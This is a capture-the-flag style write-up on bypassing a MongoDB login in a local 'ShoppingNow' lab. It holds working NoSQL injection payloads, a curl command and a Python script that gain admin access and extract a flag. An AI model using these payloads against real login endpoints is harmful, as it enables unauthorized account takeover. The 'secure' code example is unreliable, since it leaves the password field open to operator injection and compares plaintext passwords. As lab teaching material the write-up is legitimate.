# NoSQL Injection Writeup - ShoppingNow Lab

## Overview

This writeup demonstrates how to exploit a MongoDB NoSQL injection vulnerability in the ShoppingNow e-commerce application to bypass authentication and gain admin access.

## Vulnerability Analysis

The application uses a vulnerable MongoDB query structure in the login endpoint:

```python
# Vulnerable query - directly uses user input without sanitization
query = {"username": username, "password": password}
user = db.users.find_one(query)
```

The `find_one` method processes MongoDB operators directly, allowing injection attacks.

## Exploitation Steps

### Step 1: Identify the Injection Point

1. Navigate to the login page: `http://localhost:3206/login`
2. Open Burp Suite and intercept the login request
3. The application sends JSON data to `/login` endpoint

### Step 2: Basic NoSQL Injection with $ne Operator

The `$ne` (not equal) operator can be used to bypass authentication:

**Payload:**
```json
{
  "username": {"$ne": ""},
  "password": {"$ne": ""}
}
```

**Explanation:**
- `{"$ne": ""}` means "not equal to empty string"
- This will match any user where username is not empty AND password is not empty
- Since all users have non-empty usernames and passwords, this will return the first user in the database

**Result:** You will be logged in as the first user (likely `john_doe`)

### Step 3: Target Admin Account with $regex Operator

To specifically target the admin account, use the `$regex` operator:

**Payload:**
```json
{
  "username": {"$regex": "admin.*"},
  "password": {"$ne": ""}
}
```

**Explanation:**
- `{"$regex": "admin.*"}` matches any username that starts with "admin"
- This will specifically target the admin account
- Combined with `{"$ne": ""}` for password, it will bypass the password check

**Result:** You will be logged in as the admin user

### Step 4: Alternative Payloads

#### Using $exists Operator
```json
{
  "username": {"$exists": true},
  "password": {"$exists": true}
}
```

#### Using $in Operator
```json
{
  "username": {"$in": ["admin", "john_doe", "jane_smith"]},
  "password": {"$ne": ""}
}
```

#### Using $or Operator
```json
{
  "$or": [
    {"username": "admin"},
    {"username": "john_doe"}
  ],
  "password": {"$ne": ""}
}
```

## Manual Testing

### Using Burp Suite

1. **Intercept the request:**
   ```
   POST /login HTTP/1.1
   Host: localhost:3206
   Content-Type: application/json
   
   {"username":"test","password":"test"}
   ```

2. **Replace with injection payload:**
   ```json
   {
     "username": {"$regex": "admin.*"},
     "password": {"$ne": ""}
   }
   ```

3. **Forward the request**

### Using cURL

```bash
curl -X POST http://localhost:3206/login \
  -H "Content-Type: application/json" \
  -d '{"username": {"$regex": "admin.*"}, "password": {"$ne": ""}}'
```

### Using Python

```python
import requests
import json

url = "http://localhost:3206/login"
payload = {
    "username": {"$regex": "admin.*"},
    "password": {"$ne": ""}
}

response = requests.post(url, json=payload)
print(response.json())
```

## Automated Exploitation

Run the provided test script:

```bash
cd test
python test_lab.py
```

This will automatically:
1. Test basic injection with `$ne` operator
2. Test admin-specific injection with `$regex` operator
3. Access the admin dashboard
4. Extract the flag

## Flag Extraction

After successful exploitation, navigate to the admin dashboard at `http://localhost:3206/admin-dashboard` to find the flag:

```
FLAG{NoSQL_1nj3ct10n_4dm1n_byp4ss_2024}
```

## Prevention

To prevent this vulnerability:

1. **Input Validation:** Validate and sanitize all user inputs
2. **Parameterized Queries:** Use MongoDB's parameterized queries
3. **Input Encoding:** Encode special characters
4. **WAF Protection:** Implement Web Application Firewall
5. **Least Privilege:** Use minimal database permissions

## Example Secure Code

```python
# Secure approach - use parameterized queries
from pymongo import MongoClient
import re

def secure_login(username, password):
    # Validate input
    if not re.match(r'^[a-zA-Z0-9_]+$', username):
        return None
    
    # Use parameterized query
    user = db.users.find_one({
        "username": username,
        "password": password
    })
    
    return user
```

## Tools Used

- **Burp Suite Community Edition** - For intercepting and modifying requests
- **cURL** - For command-line testing
- **Python requests** - For automated exploitation
- **MongoDB Compass** - For database inspection (optional)

## Learning Objectives Achieved

✅ Identify NoSQL injection vectors in authentication endpoints  
✅ Craft payloads using MongoDB operators ($ne and $regex)  
✅ Bypass authentication to gain admin access  
✅ Understand the importance of input validation  
✅ Learn about MongoDB security best practices  

---

*This writeup is for educational purposes only. Always practice on authorized systems.* 